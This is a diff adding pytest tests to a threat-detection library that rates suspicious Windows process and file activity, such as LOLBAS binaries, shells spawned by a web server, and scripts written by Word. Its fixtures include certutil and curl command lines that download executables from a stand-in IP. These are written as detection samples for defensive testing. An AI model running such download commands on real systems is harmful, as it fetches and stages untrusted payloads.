@@ -1,8 +1,9 @@
+from types import SimpleNamespace
 from typing import Any
 
 import pytest
 
-from sibyl_h0und.flags import FlagBoard
+from sibyl_h0und.flags import HIGH, Finding, FlagBoard, Properties, flag_feedback
 from sibyl_h0und.rules import DEFAULT_RULES
 
 
@@ -102,3 +103,76 @@ def test_board_reports_a_node_once_and_again_only_when_it_changes() -> None:
     changed = board.observe(full)
 
     assert [finding.ratings for finding in changed] == [{"location": 0, "user": 1}]
+
+
+def test_lolbas_transfer_binary_with_a_url_is_medium() -> None:
+    """The toy pack works end to end: a raw image path finds its LOLBAS entry."""
+    findings = judge(
+        process(
+            image_path="C:\\Windows\\System32\\certutil.exe",
+            command_line="certutil -urlcache -f http://198.51.100.7/a.exe a.exe",
+        )
+    )
+
+    assert findings["lolbas_process"][0] == "medium"
+
+
+def test_lolbas_match_without_a_transfer_stays_low() -> None:
+    """Being a LOLBin is common, so a plain match is only traced, not shown."""
+    findings = judge(process(image_path="C:\\Windows\\System32\\rundll32.exe"))
+
+    assert findings["lolbas_process"][0] == "low"
+    assert flag_feedback(FlagBoard(DEFAULT_RULES).observe(process(image_path="rundll32"))) == []
+
+
+def test_rules_that_agree_on_a_node_make_one_line() -> None:
+    """Several rules about one node reach the model as one line at the highest level."""
+    node = process(
+        image_path="C:\\Windows\\System32\\cmd.exe",
+        parent_image="C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+        command_line="cmd /c curl http://198.51.100.7/x -o x.exe",
+    )
+
+    (line,) = flag_feedback(FlagBoard(DEFAULT_RULES).observe(node))
+
+    assert line["level"] == "high"
+    assert "web_server_spawns_shell:" in line["why"]
+    assert "lolbas_process:" in line["why"]
+
+
+def test_flags_per_result_are_capped_highest_first() -> None:
+    """A noisy result shows at most the limit, high before medium, and counts the rest."""
+    medium = [file(f"C:\\Users\\Public\\{index}.ps1") | {"id": f"m{index}"} for index in range(6)]
+    high = file("C:\\PerfLogs\\run.bat") | {"id": "h"}
+
+    lines = flag_feedback(FlagBoard(DEFAULT_RULES).observe([*medium, high]), limit=5)
+
+    assert [line.get("id") for line in lines] == ["h", "m0", "m1", "m2", "m3", None]
+    assert lines[-1]["omitted"] == 2
+
+
+def test_rule_reads_neighbors_when_the_relation_arrives_later() -> None:
+    """A file is judged again with its writer once the relation joining them is seen."""
+
+    def writer_is_office(node_id: str, node_type: str, properties: Properties, context):
+        writers = context.neighbors(node_id, direction="in", types={"wrote_file"})
+        if node_type == "windows_file" and any(
+            node.properties.get("image_path", "").endswith("winword.exe") for node in writers
+        ):
+            return Finding(node_id, node_type, "office_drop", HIGH, "written by winword.exe")
+        return None
+
+    rule = SimpleNamespace(name="office_drop", source="test", evaluate=writer_is_office)
+    board = FlagBoard([rule])
+    word = process(image_path="C:\\Program Files\\Office\\winword.exe")
+    dropped = file("C:\\Users\\bob\\AppData\\Local\\Temp\\a.js")
+
+    assert board.observe({"entities": [word, dropped]}) == []
+    relation = {"id": "rel-1", "type": "wrote_file", "source_id": "proc-1", "target_id": "file-1"}
+    (finding,) = board.observe(relation)
+
+    assert (finding.node_id, finding.reason) == ("file-1", "written by winword.exe")
+    assert board.context.endpoints("rel-1") == (
+        board.context.get("proc-1"),
+        board.context.get("file-1"),
+    )
